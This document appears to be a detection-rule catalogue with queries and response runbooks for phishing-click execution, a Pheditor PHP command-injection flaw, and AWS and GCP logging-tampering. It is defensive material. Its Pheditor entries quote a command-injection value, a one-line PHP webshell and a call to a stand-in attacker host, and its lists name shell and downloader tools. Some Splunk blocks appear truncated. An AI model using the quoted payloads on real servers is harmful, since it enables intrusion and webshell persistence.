Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user

     | rename dest AS src]

        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

PHP webserver process spawning shell/network utility (Pheditor CVE-2026-48030 RCE) AIExploitation High
Detects PHP webserver workers (php-fpm/apache2/nginx) spawning sh, curl, wget, or nc as the www-data identity — the canonical post-RCE execution signal for OS command injection in Pheditor's terminal handler via the unsanitized 'dir' POST parameter. Catches both the immediate PoC `curl ifconfig.me` exfil and the `echo ... > shell.php` webshell drop. Rationale: Article specifies vulnerable code is in pheditor.php at /var/www/html running as www-data (PoC step 5 output: uid=33(www-data)). PoC steps 4 and 5 both exec curl from the PHP context — the strongest behavioural pivot. Pairs the exact parent set (php-fpm/apache2/nginx) with the abused child set (sh/curl/wget) and constrains by the web identity to drop FPs.
ATT&CKT1190 T1059.004 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate PHP web apps that legitimately shell out to ImageMagick (`convert`), ffmpeg, or pdftotext via system()/exec()
  • Mail-delivery PHP apps invoking /usr/sbin/sendmail or msmtp as www-data
  • Container healthcheck scripts using curl to probe /health endpoints from the same www-data identity
  • Composer or npm scripts run under the webserver user during in-place deploys
  • Drupal/WordPress cron (wp-cron.php) invoking curl for outbound webhook delivery
Suppression filter
| where not (ChildCmd has_any ("/etc/alternatives/sendmail","/usr/sbin/sendmail","-t -i","msmtp","/usr/bin/convert ","ffmpeg ","pdftotext","localhost/health","127.0.0.1"))
| where not (InitiatingProcessParentFileName in~ ("cron","crond","systemd"))
Response runbook
Step 1 — Triage: pivot to the ChildCmd to confirm intent. `curl https://ifconfig.me` or `wget attacker.tld` is hostile; `sendmail -t` is benign. Pull surrounding DeviceProcessEvents on the same DeviceId ±2 minutes to reconstruct the parent web request and any sibling shell drops. Step 2 — Contain: if hostile, isolate the host (Defender Live Response or equivalent), kill the parent php-fpm worker PID, and capture /var/www and /tmp for forensics before patching. Pin Pheditor to a fixed version (>2.0.3) or remove terminal permission in pheditor config. Step 3 — Hunt: pivot UC2 (webshell write) on the same DeviceId since incident start; pivot DeviceNetworkEvents for outbound connections from php-fpm/apache2/nginx to non-corporate IPs over the last 30 days; review IIS/Apache access logs for prior POSTs to pheditor.php from the same SourceIP.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has_any ("php-fpm","php-fpm7.4","php-fpm8.0","php-fpm8.1","php-fpm8.2","apache2","httpd","nginx","php")
| where FileName in~ ("sh","bash","dash","curl","wget","nc","ncat","python","python3","perl")
| where InitiatingProcessAccountName in~ ("www-data","apache","nginx","httpd","nobody","daemon")
| project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName,
          ParentImage=InitiatingProcessFolderPath,
          ParentCmd=InitiatingProcessCommandLine,
          ChildImage=FolderPath, ChildCmd=ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("php-fpm","apache2","httpd","nginx","php")
| where ActingProcessName has_any ("/sh","/bash","/dash","/curl","/wget","/nc","/ncat","/python","/python3","/perl")
| where ActorUsername in~ ("www-data","apache","nginx","httpd","nobody","daemon")
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentProcessCommandLine,
          ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
title: PHP Webserver Spawning Shell or Network Utility - Pheditor CVE-2026-48030
id: 2a5f9e3c-7b04-4c11-9d8a-3f6e1b8c2d10
status: experimental
description: PHP webserver worker (php-fpm/apache2/nginx) spawning sh/curl/wget/nc as the web user — post-RCE execution signal for Pheditor CVE-2026-48030 'dir' parameter injection or similar PHP-based command-injection RCE.
references:
  - https://github.com/advisories/GHSA-jvc5-6g7q-c843
author: SOC Detection Engineering
date: 2026/06/10
tags:
  - attack.execution
  - attack.t1190
  - attack.t1059.004
  - attack.t1505.003
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/php-fpm'
      - '/php-fpm7.4'
      - '/php-fpm8.0'
      - '/php-fpm8.1'
      - '/php-fpm8.2'
      - '/apache2'
      - '/httpd'
      - '/nginx'
  selection_child:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/curl'
      - '/wget'
      - '/nc'
      - '/ncat'
      - '/python'
      - '/python3'
      - '/perl'
  selection_user:
    User:
      - 'www-data'
      - 'apache'
      - 'nginx'
      - 'nobody'
      - 'daemon'
  condition: selection_parent and selection_child and selection_user
falsepositives:
  - Legitimate PHP apps shelling out (image processing, mail send, cron-driven jobs)
  - Monitoring or backup scripts run under the web user
level: high
source:linux.auditd @auditd.type:EXECVE @process.executable.path:(*/sh OR */bash OR */dash OR */curl OR */wget OR */nc OR */ncat OR */python OR */python3 OR */perl) @user.name:(www-data OR apache OR nginx OR nobody OR daemon) (@process.parent.command_line:(*php-fpm* OR *apache2* OR *httpd* OR *nginx*) OR @process.command_line:(*"pheditor"* OR *"action=terminal"*))
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/(php-fpm|apache2|httpd|nginx)/i
| ImageFileName=/\/(sh|bash|dash|curl|wget|nc|ncat|python3?|perl)$/i
| UserName=/^(www-data|apache|nginx|httpd|nobody|daemon)$/i
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmdline values(Processes.process_path) as image from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("php-fpm","php-fpm7.4","php-fpm8.0","php-fpm8.1","php-fpm8.2","apache2","httpd","nginx","php")) AND (Processes.process_name IN ("sh","bash","dash","curl","wget","nc","ncat","python","python3","perl")) AND (Processes.user IN ("www-data","apache","nginx","httpd","nobody","daemon")) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmdline values(Processes.process_path) as image from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("php-fpm","php-fpm7.4","php-fpm8.0","php-fpm8.1","php-fpm8.2","apache2","httpd","nginx","php")) AND (Processes.process_name IN ("sh","bash","dash","curl","wget","nc","ncat","python","python3","perl")) AND (Processes.user IN ("www-data","apache","nginx","httpd","nobody","daemon")) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
PHP webserver writing .php file to webroot (Pheditor webshell drop) AIInstallation High
Detects a PHP webserver worker writing or modifying a .php file inside a webroot path (/var/www, /srv/www, /usr/share/nginx, inetpub/wwwroot) under the www-data identity — matches the Pheditor PoC step 5 webshell deployment (`echo '<?php system($_GET[\"c\"]);?>' > /var/www/html/shell.php`). Legitimate .php files are deployed by deploy tooling, not by the webserver itself. Rationale: PoC step 5 literally writes `/var/www/html/shell.php` from the php-fpm context. Three high-fidelity anchors: writer process (php-fpm/apache2/nginx), file extension (.php), and target path (webroot). Webshells are almost never deployed via the webserver's own identity in healthy environments — deploy tooling runs as a deploy user or root.
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • WordPress / Drupal / Joomla auto-update writing plugin or theme .php files via the webserver user
  • Composer post-install scripts triggered through a web-driven deploy hook regenerating vendor/autoload.php
  • PHP-based CMSs (e.g. ProcessWire, October CMS) compiling .php template caches into /var/www/cache
  • Webroot symlink updates during atomic blue/green deploys where the webserver user owns /var/www/current
  • Legitimate Pheditor file-create operations by a real admin saving a .php file through the editor UI
Suppression filter
| where not (FileName matches regex @"^(autoload|autoload_real|autoload_static|autoload_classmap|autoload_files|autoload_namespaces|autoload_psr4)\.php$")
| where not (FolderPath has_any ("/wp-content/upgrade/","/sites/default/files/php/twig/","/var/www/cache/","/storage/framework/views/"))
Response runbook
Step 1 — Triage: pull the file via Live Response, grep for `system(`, `passthru(`, `shell_exec(`, `eval(`, `base64_decode(`, or short single-letter $_GET/$_POST params — webshell tell. Cross-reference the InitiatingProcessCommandLine for the originating HTTP request path (often visible in php-fpm worker cmdline). Step 2 — Contain: rm the dropped file, restart php-fpm to flush opcache, isolate the host, and rotate any DB/API creds reachable from /var/www/.env. Patch Pheditor to a fixed release or disable terminal permission. Step 3 — Hunt: rerun this query org-wide back 90 days to find prior drops; pivot DeviceNetworkEvents on the offending DeviceId for callbacks from www-data; check W3CIISLog/Apache access logs for GETs to the dropped filename with single-char query params (`?c=`, `?cmd=`, `?x=`).
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FileName endswith ".php"
| where InitiatingProcessFileName has_any ("php-fpm","apache2","httpd","nginx","php")
| where FolderPath has_any ("/var/www/","/srv/www/","/usr/share/nginx/","/var/html/","\\inetpub\\wwwroot\\")
| where InitiatingProcessAccountName in~ ("www-data","apache","nginx","httpd","nobody","daemon")
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, FileSize,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName,
          InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType in ("FileCreated","FileModified")
| where TargetFileExtension =~ "php"
| where ActingProcessName has_any ("php-fpm","apache2","httpd","nginx","php")
| where TargetFilePath has_any ("/var/www/","/srv/www/","/usr/share/nginx/","\\inetpub\\wwwroot\\")
| where ActorUsername in~ ("www-data","apache","nginx","httpd","nobody","daemon")
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName,
          TargetFileSHA256, ActingProcessName, ActingProcessCommandLine,
          ActorUsername
| order by TimeGenerated desc

HTTP POST to pheditor.php with action=terminal and shell metacharacters in body AIDelivery Medium
Hunts for HTTP POSTs to the vulnerable pheditor.php endpoint carrying `action=terminal` with shell metacharacters (`;`, `|`, backtick, `$(`) in the `dir` parameter — the exact exploit shape for CVE-2026-48030. Useful where WAF or reverse-proxy logs capture POST bodies; falls back to inventorying any POST to pheditor.php for vulnerable-version asset discovery. Rationale: Article explicitly names pheditor.php and action=terminal as the targeted endpoint/parameter and lists `;`, `&&`, `||` as the metacharacters that bypass the whitelist via the `dir` field (PoC step 4: `dir=/tmp; curl -s https://ifconfig.me #`). The URL-encoded variants (%3B, %7C, %26%26, %24%28) cover encoded payloads. Where WAF body inspection isn't available, the IIS inventory branch still surfaces vulnerable-version assets in scope for asset management.
ATT&CKT1190 T1059.004
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Pheditor admins using the terminal feature with a directory path that happens to contain a semicolon (rare on Linux but possible)
  • Vulnerability scanners (Nessus, Qualys, Nuclei) sending CVE-2026-48030 probes against your perimeter
  • Internal red-team or pentest exercises with prior authorization
  • WAF audit-mode logging legitimate admin traffic with body content
  • Asset-discovery scripts hitting /pheditor.php to fingerprint deployed versions
Suppression filter
| where SrcIP !in ("<asset-scanner-ip-1>","<asset-scanner-ip-2>")
| where not (DstHost has_any ("staging.","dev.","test.") and SrcIP startswith "10.")
Response runbook
Step 1 — Triage: identify whether the source IP is a known scanner, internal admin, or external unknown. Pull the cookies header to confirm authenticated session (TPID `pheditor_password=` was set), then check the WAF/proxy response code — `{"error":false,"message":"OK"}` in 200 OK = successful exploitation. Step 2 — Contain: if external + successful, block the source IP at the edge, revoke the abused pheditor session and rotate credentials, then patch Pheditor past 2.0.3 or disable terminal permission. Step 3 — Hunt: feed the DestinationHostName into UC1 + UC2 queries for follow-on RCE/webshell signals on the corresponding host within ±10 minutes; cross-reference SourceIP against threat intel and other web app traffic.
// Try WAF first (CommonSecurityLog often captures POST body)
let WafHits = CommonSecurityLog
    | where TimeGenerated > ago(7d)
    | where RequestURL has "pheditor.php"
    | where RequestMethod =~ "POST"
    | extend Body = strcat(tostring(Message), " ", tostring(DeviceCustomString1), " ", tostring(DeviceCustomString2), " ", tostring(RequestContext))
    | where Body has "action=terminal"
    | where Body matches regex @"dir=[^&]*([;|`]|%3[Bb]|%7[Cc]|%26%26|%24%28|\$\()"
    | project TimeGenerated, SrcIP=SourceIP, DstHost=DestinationHostName, RequestURL, RequestMethod, BodySnippet=substring(Body,0,2000), DeviceVendor, DeviceProduct;
// Fall back to IIS inventory (no POST body) for asset discovery
let IisHits = W3CIISLog
    | where TimeGenerated > ago(7d)
    | where csUriStem endswith "pheditor.php"
    | where csMethod =~ "POST"
    | project TimeGenerated, SrcIP=cIP, DstHost=Computer, RequestURL=csUriStem, RequestMethod=csMethod, BodySnippet="(IIS does not log POST body)", DeviceVendor="IIS", DeviceProduct="W3CIISLog";
union WafHits, IisHits
| order by TimeGenerated desc
source:(nginx.access OR apache.access OR nginx OR apache) @http.url_details.path:*pheditor.php* @http.method:POST

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] AWS CloudTrail StopLogging — trail disabled via API · [LLM] AWS S3 bucket deletion targeting a CloudTrail log destination · [LLM] GCP Cloud Logging sink disabled via UpdateSink · [LLM] GCP log bucket deletion entering DELETE_REQUESTED state
AWS CloudTrail StopLogging — trail disabled via API AIActions on Objectives High
Detects an attacker (or insider) invoking the cloudtrail:StopLogging API to suspend log delivery to S3, creating a CloudTrail visibility gap. This is the single highest-fidelity blind-the-watchmen signal called out by Unit 42 and maps to MITRE T1562.008. Successful StopLogging calls in production are vanishingly rare outside of break-glass / planned maintenance. Rationale: Article explicitly names the cloudtrail:StopLogging permission and stop-logging API as Technique 1; the API name is the exact CloudTrail eventName emitted, making this a high-fidelity single-event detection. MITRE T1562.008 page corroborates StopLogging as a primary disable-cloud-logs sub-technique. Cross-checked against: • https://attack.mitre.org/techniques/T1562/008/
ATT&CKT1562.008
Data sourcesChange.All_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Planned CloudTrail decommissioning by cloud-engineering during account consolidation
  • Terraform / CloudFormation drift remediation that recreates a trail (stop → delete → create sequence)
  • Break-glass operator pausing logging during a sensitive migration
  • Automation rotating from a legacy single-region trail to a new org-trail
  • Cost-control script disabling redundant per-account trails after org-trail deployment
Suppression filter
| where UserIdentityArn !contains "break-glass" and UserIdentityArn !contains "terraform-deploy" and UserAgent !startswith "aws-cloudformation"
Response runbook
Step 1 — Triage: pull the IAM principal (userIdentity.arn / sessionIssuer.userName) and source IP; confirm via the change ticket / CAB whether StopLogging was authorized and verify if MFA was used (additionalEventData.MFAUsed). Step 2 — Contain: immediately re-enable the trail (StartLogging), rotate the calling principal's access keys, and revoke any active sessions for the role. If unauthorized, isolate that principal's permissions and snapshot the IAM policy chain that granted cloudtrail:StopLogging. Step 3 — Hunt: pivot on the same arn / sessionContext for ±60 minutes — look for DeleteTrail, DeleteBucket, PutBucketPolicy, GuardDuty disable, IAM CreateUser/AttachUserPolicy, and any cross-region API activity. Treat StopLogging as the start of a kill chain, not the end.
AWSCloudTrail
| where TimeGenerated > ago(7d)
| where EventName == "StopLogging"
| where isempty(ErrorCode)
| extend TrailArn = tostring(parse_json(RequestParameters).name)
| project TimeGenerated, EventName, UserIdentityArn, UserIdentityType, SourceIpAddress, UserAgent, AWSRegion, TrailArn, RecipientAccountId
| order by TimeGenerated desc

AWS S3 bucket deletion targeting a CloudTrail log destination AIActions on Objectives High
Detects DeleteBucket against an S3 bucket that was the destination for one or more CloudTrail trails, typically preceded by DeleteObject calls to empty the bucket (Unit 42 Technique 2). Destroys forensic evidence and breaks the audit chain. Correlates the bucket-deletion event with the trail-configuration error/notification that follows. Rationale: Article (Technique 2, Figure 2) calls out the exact s3:DeleteBucket + s3:DeleteObject permission pair and the resulting CloudTrail configuration notification. Joining DeleteBucket against the known CloudTrail-destination-bucket set (DescribeTrails / CreateTrail history) is what turns generic bucket deletion into a targeted log-destruction detection. Cross-checked against: • https://attack.mitre.org/techniques/T1562/008/
ATT&CKT1485 T1562.008
Data sourcesChange.All_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Account decommissioning workflow tears down trail + destination bucket in sequence
  • Cost-cleanup script deletes a stale ‘dev’ CloudTrail bucket nobody noticed had a trail attached
  • Terraform destroy on a tenant-isolated logging stack during environment rollback
  • Migration from in-account trail to org-trail leaves the old destination bucket orphaned and removed
  • Backup/forensics tooling cycling a quarantine bucket that happens to share a naming pattern
Suppression filter
| where UserAgent !startswith "aws-cloudformation" and UserAgent !startswith "terraform" and UserIdentityArn !contains "account-decom"
Response runbook
Step 1 — Triage: confirm the deleted bucket was an active CloudTrail destination via CloudTrail config history and any S3 inventory/Config snapshots; capture the principal arn, session, source IP and check MFA usage. Step 2 — Contain: revoke the calling principal's session, attach an explicit Deny for s3:DeleteBucket/s3:DeleteObject on logging buckets, and engage AWS Support if Object Lock / versioning could recover the bucket contents. Step 3 — Hunt: pivot on the principal for StopLogging, DeleteTrail, PutBucketPolicy (S3 ACL weakening) and PutEventSelectors (selector tampering) in the surrounding window; if the trail was the only org log sink, treat the period between last delivered log and detection as a blind window requiring out-of-band forensics (VPC Flow, GuardDuty, third-party network telemetry).
let trail_buckets = AWSCloudTrail
    | where TimeGenerated > ago(30d)
    | where EventName in ("CreateTrail","UpdateTrail","DescribeTrails")
    | extend BucketName = tostring(parse_json(RequestParameters).s3BucketName)
    | where isnotempty(BucketName)
    | distinct BucketName;
AWSCloudTrail
| where TimeGenerated > ago(7d)
| where EventName == "DeleteBucket"
| where isempty(ErrorCode)
| extend BucketName = tostring(parse_json(RequestParameters).bucketName)
| where BucketName in (trail_buckets)
| project TimeGenerated, EventName, BucketName, UserIdentityArn, UserIdentityType, SourceIpAddress, UserAgent, AWSRegion
| order by TimeGenerated desc
source:cloudtrail @evt.name:DeleteBucket @evt.outcome:success @userIdentity.type:(IAMUser OR AssumedRole OR Root)
# log group: /aws/cloudtrail
# Pre-stage: maintain a reference table of CloudTrail target buckets (refreshed from DescribeTrails). The query below flags any DeleteBucket; operators correlate against that list during triage.
fields @timestamp, eventName, userIdentity.arn, userIdentity.userName, userIdentity.sessionContext.sessionIssuer.userName, sourceIPAddress, userAgent, awsRegion, requestParameters.bucketName, recipientAccountId
| filter eventSource = "s3.amazonaws.com"
      and eventName in ["DeleteBucket","DeleteBucketPolicy"]
      and not isPresent(errorCode)
| sort @timestamp desc

GCP Cloud Logging sink disabled via UpdateSink AIActions on Objectives High
Detects a Cloud Logging sink being flipped to disabled=true via the logging.sinks.update method (Unit 42 Technique 1 — GCP equivalent of StopLogging). When a sink is the routing point to a customer log bucket or external SIEM, disabling it silently halts the audit trail without deleting any resource. Rationale: Article (Technique 1, Figure 1) names logging.sinks.update with the disabled field flipped to true as the GCP equivalent of CloudTrail StopLogging. The methodName google.logging.v2.ConfigServiceV2.UpdateSink combined with the disabled=true delta on the request payload is the precise audit-log shape — directly observable in Cloud Audit Logs. Cross-checked against: • https://attack.mitre.org/techniques/T1562/008/
ATT&CKT1562.008
Data sourcesChange.All_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Cost-optimisation initiative disabling a noisy sink that doubled-routed to two SIEMs
  • Migration from legacy aggregated sink to org-level sink with a deliberate disable-then-delete pattern
  • Terraform module flipping disabled=true as part of a planned environment teardown
  • Engineer pausing a sink while debugging a downstream Pub/Sub backlog
  • SOC-approved temporary disable during a noisy log-volume incident
Suppression filter
| where PrincipalEmail !endswith "@terraform.iam.gserviceaccount.com" and UserAgent !startswith "google-cloud-sdk"
Response runbook
Step 1 — Triage: identify the principalEmail and callerIp; check whether the sink routes to a log bucket, Pub/Sub topic, BigQuery dataset or external SIEM and confirm whether a change ticket exists. Step 2 — Contain: re-enable the sink (PATCH sink with disabled=false), remove logging.sinks.update from the calling principal if not required, and verify downstream log buckets are still receiving entries. Step 3 — Hunt: pivot on principalEmail for ±2 hours — look for additional UpdateSink calls, DeleteSink, DeleteBucket on log buckets, SetIamPolicy on logging resources, and any service-account key creation. Reconstruct the gap by replaying _Default sink content if the disabled sink was a redirected copy.
GCPAuditLogs
| where TimeGenerated > ago(7d)
| where MethodName == "google.logging.v2.ConfigServiceV2.UpdateSink"
| where Severity != "ERROR"
| extend SinkName = tostring(parse_json(Request).name)
| extend Disabled = tostring(parse_json(Request).sink.disabled)
| extend UpdateMask = tostring(parse_json(Request).updateMask)
| where Disabled =~ "true" or UpdateMask has "disabled"
| project TimeGenerated, MethodName, PrincipalEmail, CallerIp, UserAgent, SinkName, Disabled, UpdateMask, ProjectId
| order by TimeGenerated desc

GCP log bucket deletion entering DELETE_REQUESTED state AIActions on Objectives High
Detects logging.buckets.delete invocations (Unit 42 Technique 2 — GCP equivalent of deleting an S3 trail destination). GCP queues the deletion in a DELETE_REQUESTED state for 7 days, giving defenders a narrow but real recovery window — but the delete request itself is the high-signal event to alert on. Rationale: Article (Technique 2, GCP variant) calls out logging.buckets.delete with the 7-day DELETE_REQUESTED grace period — the methodName google.logging.v2.ConfigServiceV2.DeleteBucket is the exact audit-log emission. The grace period is operationally important: detection at delete-request time still allows UndeleteBucket-based recovery, which the runbook leverages. Cross-checked against: • https://attack.mitre.org/techniques/T1562/008/
ATT&CKT1485 T1562.008
Data sourcesChange.All_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Decommissioning of a legacy project after migration to a centralised log bucket
  • Terraform module recycling a per-environment _Default override bucket
  • Cleanup of short-lived project log buckets after a CI/CD ephemeral environment teardown
  • Cost-reduction sweep removing redundant regional log buckets
  • SRE consolidating sinks during a logging-architecture refactor
Suppression filter
| where PrincipalEmail !endswith "@terraform.iam.gserviceaccount.com" and PrincipalEmail !contains "cleanup-bot"
Response runbook
Step 1 — Triage: identify principalEmail, callerIp, the bucket name, and whether any sinks were routing to it (logging.sinks.list); confirm the bucket was not the _Required system bucket and review IAM bindings on logging.buckets.delete. Step 2 — Contain: immediately invoke UndeleteBucket on the resource (available for the full 7-day DELETE_REQUESTED window), remove logging.admin / logging.bucketWriter roles from the calling principal, and snapshot current sink configurations. Step 3 — Hunt: pivot on principalEmail for ±4 hours — correlate with UpdateSink (disable), DeleteSink, SetIamPolicy on the Logging API, and any storage.buckets.delete on archive destinations. If multiple log buckets across projects were deleted by the same principal, treat as a coordinated visibility-destruction event and escalate to IR.
GCPAuditLogs
| where TimeGenerated > ago(7d)
| where MethodName in ("google.logging.v2.ConfigServiceV2.DeleteBucket","google.logging.v2.ConfigServiceV2.UpdateBucket")
| where Severity != "ERROR"
| extend BucketName = tostring(parse_json(Request).name)
| extend LifecycleState = tostring(parse_json(Response).lifecycleState)
| where MethodName has "DeleteBucket" or LifecycleState == "DELETE_REQUESTED"
